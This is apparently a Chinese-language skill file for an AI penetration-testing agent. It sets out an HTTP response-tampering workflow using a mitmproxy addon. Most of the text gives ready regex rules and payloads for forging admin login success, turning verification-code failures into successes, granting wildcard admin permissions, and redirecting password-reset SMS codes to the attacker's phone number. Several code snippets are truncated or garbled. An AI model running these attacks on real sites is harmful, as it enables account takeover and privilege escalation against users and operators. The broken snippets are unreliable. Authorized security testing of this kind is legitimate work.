---
name: "response-modifier"
description: "分析并验证响应状态、业务字段和前端信任边界的可篡改性，支持登录、验证码、权限和业务流程场景。"
---

# HTTP响应包修改技能

>
> **本 skill 定位**：提供响应篡改模板（登录状态伪造 / 验证码劫持 / 密码重置 / 权限绕过）和"先分析、后修改"原则

> ## 本平台适配说明（必读）
>
> **平台没有内置的响应体改写引擎。** 本平台 的 `intercept` 规则控制的是
> **allow / deny / ask** 三种放行决策，不改写响应内容。本 skill 的改写能力
> 由**自带的 mitmproxy addon**（`response_modifier.py`）提供，需要单独起进程。
>
> ### 如何启用
>
> ```bash
> # 1) 确认有 mitmproxy（pip install mitmproxy）
> # 2) 起代理（脚本会自动挑一个空闲端口）
> python3 skills/response-modifier/start_proxy.py
> # 3) 让浏览器 / 目标请求走这个代理端口
> # 4) 按 rules_example.json 的格式写好规则，改名为 rules.json 放在同目录
> ```
>
> 平台侧的流量录制（`traffic_search` / `traffic_get`）**与本 skill 的 mitmproxy
> 是两套独立代理**：平台录制走任务启动时挂载的代理，本 skill 走独立端口。
> 两者可以串联（浏览器 → mitmproxy → 平台代理 → 目标），但要确认端口不冲突。
>
> 下面的方法论、规则格式与绕过模板未改动，只是把"宿主提供的能力"换成了
> 本 skill 自带的脚本。

此技能帮助你拦截和修改HTTP响应包，用于绕过验证、伪造登录状态、篡改敏感信息等测试场景。可结合宿主环境提供的请求、页面交互和状态观察能力完成验证。

## 核心原则

**重要**：修改响应包时必须遵循以下原则，避免无效修改或逻辑错误：

1. **先分析，后修改**：先观察原始响应的完整结构，包括字段名、类型、嵌套关系
2. **从可信来源获取参数**：从实际的接口、JS文件、前端代码中获取需要替换的正确值
3. **保持响应逻辑一致性**：修改后的字段之间要保持逻辑一致，不能矛盾
4. **避免模板化修改**：不要无脑替换为固定值（如 `code:0`），要根据实际业务逻辑修改

## 核心功能

- **响应拦截**：使用 本 skill 自带的 mitmproxy 代理 代理拦截 HTTP/HTTPS 响应（监听 本 skill 启动的代理端口（见下方"如何启用"））
- **响应修改**：通过 `mitmproxy 规则（`rules` 配置）` 规则引擎修改响应体中的任意字段值
- **登录状态伪造**：将登录失败修改为成功
- **验证码绕过**：修改短信验证码相关响应
- **密码重置攻击**：篡改密码重置接口的手机号
- **流量自动捕获**：通过 `mitmproxy 日志 / 平台 `traffic_get`` 获取篡改前后的完整流量对比
- **被动风险检测**：`平台 `traffic_search` 的敏感内容检索` 自动识别篡改过程中暴露的敏感信息

## 工作原理

基于 本 skill 自带的 mitmproxy 代理 实现中间人代理，在 HTTP 响应返回客户端之前通过规则引擎修改响应内容。

```
浏览器 → 本 skill 自带的 mitmproxy 代理(本 skill 启动的代理端口（见下方"如何启用"）, 规则拦截) → 服务器
浏览器 ← 本 skill 自带的 mitmproxy 代理(响应体修改后) ← 服务器
        ↑
   mitmproxy 规则（`rules` 配置） 定义替换规则
```

## 典型应用场景

### 0. 修改前的准备：分析原始响应

**必须先使用 平台浏览器 MCP 或 mitmproxy 日志 抓包获取真实响应结构**：

```python
# 使用 list_network_requests 获取目标接口的响应
# 分析响应中的所有字段及其含义
# 确定需要修改的字段和正确目标值
```

**示例原始响应**（从抓包获取）：
```json
{"status":500,"error":"Invalid credentials","user_info":null}
```

**分析**：
- `status` 字段表示业务状态
- `error` 字段是错误信息
- `user_info` 为null表示未返回用户数据

### 1. 登录状态伪造

**场景**：登录接口返回失败，修改为成功

**错误做法（模板化）**：
```json
{"code":0,"status":"success"}  // 瞎改字段名，code根本不存在
```

**正确做法（基于分析）**：
```json
{"status":200,"error":null,"user_info":{"uid":10001,"name":"test"}}
```

**关键点**：保留原有字段结构，只修改必要字段

### 2. 注册绕过验证

**场景**：绕过邮箱/手机号验证

**必须先获取正确的响应格式**，可从以下来源：
- 其他成功注册的接口返回
- 前端JS代码中的响应处理逻辑
- 相似的成功接口结构

**错误做法（瞎改）**：
```json
{"status":200,"data":{"user_id":123,"token":"xxx"}}  // user_id和token字段可能不存在
```

**正确做法（基于实际结构）**：
```json
{"status":200,"message":"注册成功","data":{"id":12345,"token":"eyJhbGci..."}}
```

### 3. 短信验证码劫持

**场景**：修改短信发送接口返回的手机号

**必须先确认返回的手机号字段格式**：

```python
# 使用平台浏览器 MCP 或 mitmproxy 日志抓包，查看实际响应结构
# 可能是 "phone"、"mobile"、"data.phone" 等不同格式
```

**错误做法（瞎改）**：
```json
{"data":"18013172275"}  // 直接替换，不知道字段在哪
```

**正确做法（基于抓包分析）**：
```json
{"status":200,"data":{"phone":"18013172275","code":"123456"}}
```

### 4. 权限绕过

**场景**：普通用户获取管理员权限

**必须先获取正确的权限字段和值**：

```python
# 步骤1：抓包获取管理员账号的正常响应
# 步骤2：对比普通用户和管理员响应的差异
# 步骤3：只修改差异字段
```

**错误做法（瞎改）**：
```json
{"code":200,"data":{"role":"admin","permission":"all"}}  // role字段可能叫 role_id 或 group
```

**正确做法（基于对比分析）**：
```json
{"code":200,"data":{"role_id":1,"group_name":"admin","permissions":["*"]}}
```

## 使用步骤

### 第一步：启动 本 skill 自带的 mitmproxy 代理

```python
# 确保 本 skill 自带的 mitmproxy 代理 已在 本 skill 启动的代理端口（见下方"如何启用"） 监听
  listen_port: 8080,
  cert_file: null,
  key_file: null,
  listen_addr: "127.0.0.1"
)
```

如果 流量中间处理 已启动则跳过，未启动则启动。

### 第二步：配置浏览器代理

- **平台浏览器 MCP（`mcp__browser__*`）**：所有无头浏览器流量强制经过 `本 skill 启动的代理端口（见下方"如何启用"）`
- **浏览器交互能力 渗透模式**：`bsk pentest-navigate <url>` 内部自动配置代理
- **手动浏览器**：使用 `宿主环境提供的浏览器交互能力` 启动自带 `--proxy-server=http://本 skill 启动的代理端口（见下方"如何启用"）` 的 Chrome


通过 `mitmproxy 规则（`rules` 配置）` 注入响应替换规则，规则采用 JSON 数组格式，支持正则匹配和替换：

```python
# 构造规则数组
rules = [
    {
        # 登录失败 → 登录成功
        "Pattern": "\\\"status\\\"\\s*:\\s*500.*error.*",
        "Replace": "{\"status\":200,\"error\":null,\"user_info\":{\"uid\":10001,\"name\":\"admin\",\"role\":\"admin\"}}",
        "Tags": ["status_success", "response-modifier"],
        "NoReplace": false
    },
    {
        # 替换验证码错误为成功
        "Pattern": "验证码错误",
        "Replace": "验证成功",
        "Tags": ["status_success", "response-modifier"],
        "NoReplace": false
    },
    {
        # 仅高亮标记，不做替换（用于确认规则是否触发）
        "Pattern": "no_login",
        "Tags": ["status_failure", "response-modifier"],
        "NoReplace": true
    }
]

# 注入规则到 本 skill 自带的 mitmproxy 代理
```

### 第四步：触发篡改

启动浏览器访问目标页面，触发目标接口：

```python
# 方式1：通过 平台浏览器 MCP 或 mitmproxy 日志 导航
page = mcp('平台浏览器 MCP 或 mitmproxy 日志')['new_page'](url="https://target.com/login")
# 执行登录操作，流量经过 本 skill 自带的 mitmproxy 代理，规则自动匹配并篡改

# 方式2：通过 浏览器交互能力 渗透模式
bsk pentest-navigate https://target.com/login
```

### 第五步：验证篡改效果

```python
# 通过 mitmproxy 日志 / 平台 `traffic_get` 获取篡改后的流量，确认响应已被修改
  limit: 20,
  since: "<session-start-time>",
  scope: "all"
)

# 通过 平台浏览器 MCP 或 mitmproxy 日志 观察页面行为
screenshot = mcp('平台浏览器 MCP 或 mitmproxy 日志')['页面截图']()
```

## 常用修改模式

### 模式1：基于抓包的条件修改（推荐）

```python
# 第一步：先用 平台浏览器 MCP 或 mitmproxy 日志 抓包获取真实响应
# 第二步：分析响应结构后编写精确的替换规则

# 从抓包获取的原始失败响应：
# {"status":500,"error":"Invalid credentials","user_info":null}

# 构造目标响应（保留原有字段结构，只修改必要字段）：
target_response = json.dumps({
    "status": 200,
    "error": None,
    "user_info": {"uid": 10001, "name": "admin", "role": "admin"}
})

rules = [
    {
        # 精确匹配：状态码 500 的登录失败响应
        "Pattern": "\\\"status\\\"\\s*:\\s*5\\d{2}.*\\\"error\\\".*",
        "Replace": target_response,
        "Tags": ["status_success", "response-modifier"],
        "NoReplace": false
    }
]

```

### 模式2：从可信来源获取目标值

```python
# 不要硬编码值，应该从实际来源获取
# 来源1：平台浏览器 MCP 或 mitmproxy 日志 抓包获取的其他成功接口
# 来源2：前端 JS 代码中定义的业务常量
# 来源3：相同接口在正常情况下的返回

# 示例：从登录失败响应修改为成功
# 通过 平台浏览器 MCP 或 mitmproxy 日志 抓取管理员成功登录的响应结构：
admin_success_response = json.dumps({
    "code": 0,
    "message": "登录成功",
    "data": {
        "uid": 10001,
        "username": "admin",
        "role": "admin",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    }
})

rules = [
    {
        "Pattern": "\\\"code\\\"\\s*:\\s*[^0].*",
        "Replace": admin_success_response,
        "Tags": ["status_success", "response-modifier"],
        "NoReplace": false
    }
]

```

### 模式3：字段替换（需先确认字段位置）

```python
# 只替换响应中的特定字段值，保持其他字段不变
# 适用于修改单个字段（如手机号、状态码）的场景

# 示例：将短信验证码响应中的手机号替换为自己的
rules = [
    {
        # 匹配手机号字段（需先确认字段名和位置）
        "Pattern": "\\\"phone\\\"\\s*:\\s*\\\"\\d{11}\\\"",
        "Replace": "\"phone\": \"18013172275\"",
        "Tags": ["status_success", "response-modifier"],
        "NoReplace": false
    }
]

```

### 模式4：仅高亮标记（调试诊断）

```python
# 不修改响应内容，仅标记命中规则的请求/响应
# 用于确认规则是否触达、确认响应中是否存在特定内容

rules = [
    {
        "Pattern": "验证码错误",
        "Tags": ["status_failure", "response-modifier"],
        "NoReplace": true
    },
    {
        "Pattern": "no_login",
        "Tags": ["status_failure", "response-modifier"],
        "NoReplace": true
    }
]

# 然后在 mitmproxy 日志 / 平台 `traffic_get` 或 平台 `traffic_search` 的敏感内容检索 结果中查看 tags 命中情况
```

### 模式5：全响应替换（复杂场景）

```python
# 当正则匹配不够精确时，可以用更精确的规则组合
# 注意：HTTPS 响应体替换在某些场景可能不生效（见下文限制）

# 先验证规则是否触发（仅高亮）
rules_debug = [
    {
        "Pattern": "status",
        "Tags": ["status_failure", "response-modifier"],
        "NoReplace": true
    }
]

# 确认规则触发后，再执行实际替换
rules_replace = [
    {
        "Pattern": ".*",
        "Replace": json.dumps({"status": 200, "data": {"result": "success"}}),
        "Tags": ["status_success", "response-modifier"],
        "NoReplace": false
    }
]
```

## 与 平台浏览器 MCP 或 mitmproxy 日志 配合使用

### 完整工作流程

```
┌─────────────────────────────────────────────────────────────────┐
│                    端到端响应篡改测试流程                        │
├─────────────────────────────────────────────────────────────────┤
│  1. 启动 本 skill 自带的 mitmproxy 代理 代理                                        │
│                                                                 │
│  2. 启动 平台浏览器 MCP（`mcp__browser__*`）                                  │
│     - 使用 new_page 打开目标站点                                │
│     - 流量自动经过 本 skill 启动的代理端口（见下方"如何启用"）         │
│                                                                 │
│  3. 抓包分析（list_network_requests）                           │
│     - 拦截登录/注册/验证码等接口                                │
│     - 分析请求参数和响应结构                                    │
│                                                                 │
│  4. 注入篡改规则（mitmproxy 规则（`rules` 配置））                           │
│     - 伪造登录成功                                              │
│     - 劫持验证码手机号                                          │
│     - 绕过权限验证                                              │
│                                                                 │
│  5. 验证结果（浏览器页面操作）                                  │
│     - 检查页面是否显示登录成功                                  │
│     - 验证是否获得了预期权限                                    │
│     - 通过 mitmproxy 日志 / 平台 `traffic_get` 确认流量篡改结果                     │
└─────────────────────────────────────────────────────────────────┘
```

### 步骤详解

#### 第一步：抓包分析原始响应（关键！）

**使用 平台浏览器 MCP 或 mitmproxy 日志 获取真实响应**：

```python
# 1. 使用 new_page 打开目标站点
# 2. 执行登录等操作触发目标接口
# 3. 使用 list_network_requests 获取响应内容
# 4. 分析响应的完整结构
```

**必须确认的信息**：
- 响应的字段名（status vs code vs success）
- 字段的数据类型（字符串、数字、嵌套对象）
- 成功和失败状态的字段差异
- 原始响应中已有的数据结构

#### 第二步：启动 本 skill 自带的 mitmproxy 代理 代理

```python
# 确保 流量中间处理 已启动（监听 本 skill 启动的代理端口（见下方"如何启用"））
  listen_port: 8080,
  listen_addr: "127.0.0.1"
)
```

#### 第三步：使用 平台浏览器 MCP 或 mitmproxy 日志 打开浏览器

```python
# 通过 平台浏览器 MCP 或 mitmproxy 日志 创建新页面
# 流量自动经过 本 skill 启动的代理端口（见下方"如何启用"）
# 或使用 宿主环境提供的浏览器交互能力 启动带代理的 Chrome
```

#### 第四步：使用 平台浏览器 MCP 或 mitmproxy 日志 抓包分析

使用 `list_network_requests` 工具获取网络请求，识别目标接口：
- 登录接口：`/api/login`
- 注册接口：`/api/register`
- 验证码接口：`/api/sms/send`
- 密码重置：`/api/forgot`

#### 第五步：注入篡改规则

**根据抓包结果，编写基于实际响应的修改规则**：

```python
# 示例：从抓包获取的原始失败响应结构
# 原始响应：{"status":500,"error":"Invalid credentials","user_info":null}
# 目标响应：{"status":200,"error":null,"user_info":{"uid":10001,"name":"admin","token":"eyJ..."}}

target = json.dumps({
    "status": 200,
    "error": None,
    "user_info": {
        "uid": 10001,
        "name": "admin",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    }
})

# 注入规则前，先用 NoReplace=true 验证规则是否触发
rules = [
    {
        "Pattern": "status.*500",
        "Tags": ["status_failure", "response-modifier"],
        "NoReplace": true
    }
]

# 确认规则触发后，执行实际替换
rules = [
    {
        "Pattern": ".*",
        "Replace": target,
        "Tags": ["status_success", "response-modifier"],
        "NoReplace": false
    }
]
```

**获取目标值的方法**：
1. 用 平台浏览器 MCP 或 mitmproxy 日志 抓取同一个接口成功时的响应
2. 抓取其他相关接口（如个人中心）获取用户数据结构
3. 查看前端 JS 代码中的 Mock 数据或业务常量
4. 参考同一个系统其他接口的响应格式

#### 第六步：验证篡改效果

```python
# 方式1：通过 mitmproxy 日志 / 平台 `traffic_get` 检查篡改后的响应
  limit: 20,
  since: "<篡改操作开始时间>",
  scope: "all"
)

# 方式2：通过 平台浏览器 MCP 或 mitmproxy 日志 观察页面行为
mcp('平台浏览器 MCP 或 mitmproxy 日志')['页面截图']()

# 方式3：通过 平台 `traffic_search` 的敏感内容检索 检查被动风险检测结果
```

### 执行能力适配

执行后端可替换。需要确保请求/响应可观察、页面或脚本状态可验证、修改前后差异可记录。

### 典型测试场景流程

**核心原则：先分析，后修改。不确定原始响应结构时不要盲目修改。**

#### 场景1：登录状态伪造

1. **抓包分析（必须）**：
   - 使用 `new_page` 打开登录页面
   - 故意输入错误密码触发失败响应
   - 使用 `list_network_requests` 获取失败响应的完整结构
   - 记录字段名、数据类型、嵌套关系

2. **获取正确数据**：
   - 用正确账号登录获取成功响应结构
   - 或从用户中心接口获取 user_info 结构

3. **注入精确篡改规则**：
   - 基于原始失败响应结构构造目标 JSON
   - 通过 `mitmproxy 规则（`rules` 配置）` 注入规则
   - 先 `NoReplace: true` 验证规则触发，再执行实际替换

4. **验证**：检查页面是否跳转到首页

#### 场景2：验证码劫持

1. **抓包分析（必须）**：
   - 使用 `new_page` 打开忘记密码页面
   - 输入目标用户名
   - 使用 `list_network_requests` 获取短信发送接口响应
   - 确认手机号字段的准确路径（如 `data.phone` vs `data.mobile`）

2. **获取正确手机号**：
   - 确认自己需要接收验证码的手机号格式

3. **注入精确篡改规则**：
   - 根据抓包确认的字段路径构造正则规则
   - 注入 `mitmproxy 规则（`rules` 配置）`

4. **验证**：接收验证码并重置密码

## 执行能力适配

本 Skill 只定义分析目标、验证逻辑和结果要求。请求发送、页面交互、流量处理、脚本分析、证据采集等执行能力由宿主环境按当前任务选择，不影响本 Skill 的判断流程。

## 故障排除

### 问题1：响应修改后页面仍然失败

**原因**：使用了模板化的修改，没有基于原始响应结构

**解决方案**：
1. 先用 平台浏览器 MCP 或 mitmproxy 日志 抓包确认原始响应结构
2. 检查修改后的字段名是否与原始响应一致
3. 确保修改的是实际存在的字段

### 问题2：响应未被修改

**解决方案**：
1. 确认 `启动流量处理` 已在 本 skill 启动的代理端口（见下方"如何启用"） 监听
2. 先用 `NoReplace: true` 模式验证规则是否触发（在 `mitmproxy 日志 / 平台 `traffic_get`` 中检查 tags）
3. 检查正则表达式是否匹配实际响应内容（注意 JSON 中的转义）
4. 确认浏览器流量确实经过 本 skill 启动的代理端口（见下方"如何启用"）

### 问题3：HTTPS 响应体替换不生效

**已知限制**：本 skill 自带的 mitmproxy 代理 的 `mitmproxy 规则（`rules` 配置）` 在 HTTPS 场景下，body 替换可能不生效（tag 高亮可正常触发）。

**解决方案**：
1. 先用 `NoReplace: true` 确认规则触发
2. 改用 `create_web_fuzzer_tab` + hot-patch 代码方式
3. 或使用 平台浏览器 MCP（`mcp__browser__*`）（浏览器层有 流量中间处理 解密完整链路）
4. 或使用 `浏览器交互能力` 渗透模式的 `bsk pentest-navigate`（内部包含完整的端到端 流量中间处理 解密）

### 问题4：修改后页面崩溃

**原因**：修改后的响应结构与前端期望的不一致

**解决方案**：
1. 不要完全替换整个响应，只修改必要字段
2. 保持原始响应的字段结构
3. 从 平台浏览器 MCP 或 mitmproxy 日志 抓包获取正确的成功响应作为参考




